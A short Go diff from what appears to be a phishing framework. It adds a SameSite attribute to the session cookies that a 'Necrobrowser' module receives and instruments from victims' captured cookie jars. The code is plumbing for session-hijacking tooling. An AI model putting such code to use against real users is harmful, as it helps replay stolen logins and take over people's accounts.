@@ -50,6 +50,7 @@ type SessionCookie struct {
 	HTTPOnly bool   `json:"httpOnly"`
 	Secure   bool   `json:"secure"`
 	Session  bool   `json:"session"`
+	SameSite string `json:"sameSite,omitempty"`
 }
 
 // VictimCredentials structure
@@ -213,6 +214,7 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 			HTTPOnly: c.HTTPOnly,
 			Secure:   c.Secure,
 			Session:  t.Unix() < 1,
+			SameSite: c.SameSite,
 		}
 
 		necroCookies = append(necroCookies, nc)
